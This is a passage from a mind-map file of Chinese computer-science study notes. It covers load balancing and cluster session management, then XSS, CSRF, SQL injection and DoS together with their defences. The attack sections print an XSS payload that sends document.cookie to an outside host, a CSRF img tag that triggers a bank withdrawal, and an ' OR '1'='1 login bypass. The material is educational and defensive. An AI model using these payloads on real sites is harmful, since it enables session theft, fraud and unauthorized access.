      大型网站基本使用了 DNS 做为第一级负载均衡手段，然后在内部使用其它方式做第二级负载均衡。也就是说，域名解析的结果为内部的负载均衡服务器 IP 地址。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/366291bcf5cdea962917e52ed83b792330bb7718270522f5194bbcd0b8ddd9dc/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f64326330373263632d386231372d343830632d383133652d3138636462336234623531662e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/366291bcf5cdea962917e52ed83b792330bb7718270522f5194bbcd0b8ddd9dc/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f64326330373263632d386231372d343830632d383133652d3138636462336234623531662e6a7067" width="500px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d2c072cc-8b17-480c-813e-18cdb3b4b51f.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_358650624" CREATED="1754750651009" MODIFIED="1754750651011"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 反向代理服务器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 反向代理服务器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9B%86%E7%BE%A4.md#3-反向代理服务器">
</a>
    <p dir="auto">
      反向代理服务器位于源服务器前面，用户的请求需要先经过反向代理服务器才能到达源服务器。反向代理可以用来进行缓存、日志记录等，同时也可以用来做为负载均衡服务器。
    </p>
    <p dir="auto">
      在这种负载均衡转发方式下，客户端不直接请求源服务器，因此源服务器不需要外部 IP 地址，而反向代理需要配置内部和外部两套 IP 地址。
    </p>
    <p dir="auto">
      优点：
    </p>
    <ul dir="auto">
      <li>
        与其它功能集成在一起，部署简单。
      </li>
    </ul>
    <p dir="auto">
      缺点：
    </p>
    <ul dir="auto">
      <li>
        所有请求和响应都需要经过反向代理服务器，它可能会成为性能瓶颈。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_761813647" CREATED="1754750651011" MODIFIED="1754750651013"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 网络层
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 网络层" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9B%86%E7%BE%A4.md#4-网络层">
</a>
    <p dir="auto">
      在操作系统内核进程获取网络数据包，根据负载均衡算法计算源服务器的 IP 地址，并修改请求数据包的目的 IP 地址，最后进行转发。
    </p>
    <p dir="auto">
      源服务器返回的响应也需要经过负载均衡服务器，通常是让负载均衡服务器同时作为集群的网关服务器来实现。
    </p>
    <p dir="auto">
      优点：
    </p>
    <ul dir="auto">
      <li>
        在内核进程中进行处理，性能比较高。
      </li>
    </ul>
    <p dir="auto">
      缺点：
    </p>
    <ul dir="auto">
      <li>
        和反向代理一样，所有的请求和响应都经过负载均衡服务器，会成为性能瓶颈。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1404326760" CREATED="1754750651014" MODIFIED="1754750651016"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 链路层
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5. 链路层" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9B%86%E7%BE%A4.md#5-链路层">
</a>
    <p dir="auto">
      在链路层根据负载均衡算法计算源服务器的 MAC 地址，并修改请求数据包的目的 MAC 地址，并进行转发。
    </p>
    <p dir="auto">
      通过配置源服务器的虚拟 IP 地址和负载均衡服务器的 IP 地址一致，从而不需要修改 IP 地址就可以进行转发。也正因为 IP 地址一样，所以源服务器的响应不需要转发回负载均衡服务器，可以直接转发给客户端，避免了负载均衡服务器的成为瓶颈。
    </p>
    <p dir="auto">
      这是一种三角传输模式，被称为直接路由。对于提供下载和视频服务的网站来说，直接路由避免了大量的网络传输数据经过负载均衡服务器。
    </p>
    <p dir="auto">
      这是目前大型网站使用最广负载均衡转发方式，在 Linux 平台可以使用的负载均衡服务器为 LVS（Linux Virtual Server）。
    </p>
    <p dir="auto">
      参考：
    </p>
    <ul dir="auto">
      <li>
        <a href="http://www.jscape.com/blog/load-balancing-algorithms" rel="nofollow">Comparing Load Balancing Algorithms</a>
      </li>
      <li>
        <a href="http://slideplayer.com/slide/6599069/#" rel="nofollow">Redirection and Load Balancing</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_1989459006" CREATED="1754750651016" MODIFIED="1754750651017"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、集群下的 Session 管理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二、集群下的 Session 管理" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9B%86%E7%BE%A4.md#二集群下的-session-管理">
</a>
    <p dir="auto">
      一个用户的 Session 信息如果存储在一个服务器上，那么当负载均衡器把用户的下一个请求转发到另一个服务器，由于服务器没有用户的 Session 信息，那么该用户就需要重新进行登录等操作。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1218780431" CREATED="1754750651018" MODIFIED="1754750651020"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Sticky Session
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Sticky Session" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9B%86%E7%BE%A4.md#sticky-session">
</a>
    <p dir="auto">
      需要配置负载均衡器，使得一个用户的所有请求都路由到同一个服务器，这样就可以把用户的 Session 存放在该服务器中。
    </p>
    <p dir="auto">
      缺点：
    </p>
    <ul dir="auto">
      <li>
        当服务器宕机时，将丢失该服务器上的所有 Session。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/191ccc3b202cdbe725018076d607481556481ab69cc76d2aed2b3b1f7630e4a2/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31363233663532342d623031312d343063382d623833662d6561623338643533386637362e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/191ccc3b202cdbe725018076d607481556481ab69cc76d2aed2b3b1f7630e4a2/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31363233663532342d623031312d343063382d623833662d6561623338643533386637362e706e67" width="400px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1623f524-b011-40c8-b83f-eab38d538f76.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_650497352" CREATED="1754750651021" MODIFIED="1754750651023"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Session Replication
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Session Replication" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9B%86%E7%BE%A4.md#session-replication">
</a>
    <p dir="auto">
      在服务器之间进行 Session 同步操作，每个服务器都有所有用户的 Session 信息，因此用户可以向任何一个服务器进行请求。
    </p>
    <p dir="auto">
      缺点：
    </p>
    <ul dir="auto">
      <li>
        占用过多内存；
      </li>
      <li>
        同步过程占用网络带宽以及服务器处理器时间。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c940b90a35ca1c4890ac33d8bcb38ad3fb71333e2df03d042da544a2b8802b1b/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f34306336353730642d633164372d346333382d383433652d6261393931623233323863322e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/c940b90a35ca1c4890ac33d8bcb38ad3fb71333e2df03d042da544a2b8802b1b/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f34306336353730642d633164372d346333382d383433652d6261393931623233323863322e706e67" width="400px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/40c6570d-c1d7-4c38-843e-ba991b2328c2.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1982383371" CREATED="1754750651023" MODIFIED="1754750651025"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Session Server
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Session Server" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9B%86%E7%BE%A4.md#session-server">
</a>
    <p dir="auto">
      使用一个单独的服务器存储 Session 数据，可以使用传统的 MySQL，也使用 Redis 或者 Memcached 这种内存型数据库。
    </p>
    <p dir="auto">
      优点：
    </p>
    <ul dir="auto">
      <li>
        为了使得大型网站具有伸缩性，集群中的应用服务器通常需要保持无状态，那么应用服务器不能存储用户的会话信息。Session Server 将用户的会话信息单独进行存储，从而保证了应用服务器的无状态。
      </li>
    </ul>
    <p dir="auto">
      缺点：
    </p>
    <ul dir="auto">
      <li>
        需要去实现存取 Session 的代码。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/01ef52ad83a11e211038cca423808c29a37db20ecf478b6a18decec91ec664a4/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f66646334356130392d663833382d343334382d383935392d6432633739333732373738382e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/01ef52ad83a11e211038cca423808c29a37db20ecf478b6a18decec91ec664a4/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f66646334356130392d663833382d343334382d383935392d6432633739333732373738382e706e67" width="600px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/fdc45a09-f838-4348-8959-d2c793727788.png"/>
    </a><br/>
    

    <p dir="auto">
      参考：
    </p>
    <ul dir="auto">
      <li>
        <a href="https://sivalabs.in/2018/02/session-management-using-spring-session-jdbc-datastore/" rel="nofollow">Session Management using Spring Session with JDBC DataStore</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_507313577" CREATED="1754749809777" MODIFIED="1754750722294" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      攻击技术
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1049190340" CREATED="1754750651028" MODIFIED="1754750651028"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、跨站脚本攻击
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1476100696" CREATED="1754750651030" MODIFIED="1754750651031"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      概念
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 概念" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#概念">
</a>
    <p dir="auto">
      跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1333595983" CREATED="1754750651032" MODIFIED="1754750651033"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      攻击原理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 攻击原理" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#攻击原理">
</a>
    <p dir="auto">
      例如有一个论坛网站，攻击者可以在上面发布以下内容：
    </p>
    <pre>&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;</pre>
    <p dir="auto">
      之后该内容可能会被渲染成以下形式：
    </p>
    <pre>&lt;p&gt;&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;&lt;/p&gt;</pre>
    <p dir="auto">
      另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1648324777" CREATED="1754750651033" MODIFIED="1754750651035"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      危害
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 危害" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#危害">
</a>
    <ul dir="auto">
      <li>
        窃取用户的 Cookie
      </li>
      <li>
        伪造虚假的输入表单骗取个人信息
      </li>
      <li>
        显示伪造的文章或者图片
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1368208710" CREATED="1754750651036" MODIFIED="1754750651036"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      防范手段
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1089694361" CREATED="1754750651037" MODIFIED="1754750651039"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 设置 Cookie 为 HttpOnly
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 设置 Cookie 为 HttpOnly" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#1-设置-cookie-为-httponly">
</a>
    <p dir="auto">
      设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1286023772" CREATED="1754750651039" MODIFIED="1754750651041"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 过滤特殊字符
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 过滤特殊字符" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#2-过滤特殊字符">
</a>
    <p dir="auto">
      例如将 <code>&lt;</code>&#xa0;转义为 <code>&amp;lt;</code>，将 <code>&gt;</code>&#xa0;转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。
    </p>
    <p dir="auto">
      富文本编辑器允许用户输入 HTML 代码，就不能简单地将 <code>&lt;</code>&#xa0;等字符进行过滤了，极大地提高了 XSS 攻击的可能性。
    </p>
    <p dir="auto">
      富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。
    </p>
    <p dir="auto">
      以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。
    </p>
    <pre>&lt;h1 id=&quot;title&quot;&gt;XSS Demo&lt;/h1&gt;
&lt;p&gt;123&lt;/p&gt;
&lt;form&gt;
  &lt;input type=&quot;text&quot; name=&quot;q&quot; value=&quot;test&quot;&gt;
&lt;/form&gt;
&lt;pre&gt;hello&lt;/pre&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
alert(/xss/);
&lt;/script&gt;</pre>
    <pre>&lt;h1&gt;XSS Demo&lt;/h1&gt;
&lt;p&gt;123&lt;/p&gt;
&amp;lt;form&amp;gt;
  &amp;lt;input type=&quot;text&quot; name=&quot;q&quot; value=&quot;test&quot;&amp;gt;
&amp;lt;/form&amp;gt;
&lt;pre&gt;hello&lt;/pre&gt;
&amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
alert(/xss/);
&amp;lt;/script&amp;gt;</pre>
    <blockquote>
      <p dir="auto">
        <a href="http://jsxss.com/zh/try.html" rel="nofollow">XSS 过滤在线测试</a>
      </p>
    </blockquote>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_1708545479" CREATED="1754750651041" MODIFIED="1754750651041"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、跨站请求伪造
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1839996566" CREATED="1754750651043" MODIFIED="1754750651044"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      概念
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 概念" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#概念-1">
</a>
    <p dir="auto">
      跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。
    </p>
    <p dir="auto">
      XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1365807002" CREATED="1754750651045" MODIFIED="1754750651047"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      攻击原理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 攻击原理" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#攻击原理-1">
</a>
    <p dir="auto">
      假如一家银行用以执行转账操作的 URL 地址如下：
    </p>
    <pre class="notranslate">http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。</pre>
    <p dir="auto">
      那么，一个恶意攻击者可以在另一个网站上放置如下代码：
    </p>
    <pre class="notranslate">&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。</pre>
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="&lt;lt; src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。" tabindex="0" role="button">
    </clipboard-copy>
    

    <p dir="auto">
      如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。
    </p>
    <p dir="auto">
      这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。
    </p>
    <p dir="auto">
      通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_389128794" CREATED="1754750651047" MODIFIED="1754750651047"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      防范手段
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_809446013" CREATED="1754750651049" MODIFIED="1754750651050"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 检查 Referer 首部字段
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 检查 Referer 首部字段" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#1-检查-referer-首部字段">
</a>
    <p dir="auto">
      Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。
    </p>
    <p dir="auto">
      这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_142226882" CREATED="1754750651050" MODIFIED="1754750651052"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 添加校验 Token
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 添加校验 Token" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#2-添加校验-token">
</a>
    <p dir="auto">
      在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_658137482" CREATED="1754750651052" MODIFIED="1754750651054"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 输入验证码
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 输入验证码" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#3-输入验证码">
</a>
    <p dir="auto">
      因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_1628929830" CREATED="1754750651054" MODIFIED="1754750651054"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、SQL 注入攻击
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1841142702" CREATED="1754750651055" MODIFIED="1754750651057"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      概念
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 概念" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#概念-2">
</a>
    <p dir="auto">
      服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_542527369" CREATED="1754750651057" MODIFIED="1754750651058"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      攻击原理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 攻击原理" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#攻击原理-2">
</a>
    <p dir="auto">
      例如一个网站登录验证的 SQL 查询代码为：
    </p>
    <pre>strSQL = &quot;SELECT * FROM users WHERE (name = '&quot; + userName + &quot;') and (pw = '&quot;+ passWord +&quot;');&quot;</pre>
    <p dir="auto">
      如果填入以下内容：
    </p>
    <pre>userName = &quot;1' OR '1'='1&quot;;
passWord = &quot;1' OR '1'='1&quot;;</pre>
    <p dir="auto">
      那么 SQL 查询字符串为：
    </p>
    <pre>strSQL = &quot;SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');&quot;</pre>
    <p dir="auto">
      此时无需验证通过就能执行以下查询：
    </p>
    <pre>strSQL = &quot;SELECT * FROM users;&quot;</pre>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_448722918" CREATED="1754750651059" MODIFIED="1754750651059"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      防范手段
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_995368530" CREATED="1754750651061" MODIFIED="1754750651062"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 使用参数化查询
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 使用参数化查询" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#1-使用参数化查询">
</a>
    <p dir="auto">
      Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。
    </p>
    <pre>PreparedStatement stmt = connection.prepareStatement(&quot;SELECT * FROM users WHERE userid=? AND password=?&quot;);
stmt.setString(1, userid);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1788445055" CREATED="1754750651063" MODIFIED="1754750651064"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 单引号转换
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 单引号转换" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#2-单引号转换">
</a>
    <p dir="auto">
      将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node ID="ID_10933823" CREATED="1754750651064" MODIFIED="1754750651066"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      四、拒绝服务攻击
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 四、拒绝服务攻击" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#四拒绝服务攻击">
</a>
    <p dir="auto">
      拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。
    </p>
    <p dir="auto">
      分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1514158596" CREATED="1754750651066" MODIFIED="1754750651068"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        <a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" rel="nofollow">维基百科：跨站脚本</a>
      </li>
      <li>
        <a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A" rel="nofollow">维基百科：SQL 注入攻击</a>
      </li>
      <li>
        <a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" rel="nofollow">维基百科：跨站点请求伪造</a>
      </li>
      <li>
        <a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A" rel="nofollow">维基百科：拒绝服务攻击</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_629305147" CREATED="1754749809781" MODIFIED="1754750719814" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      缓存
    </p>
  </body>
</html>
</richcontent>
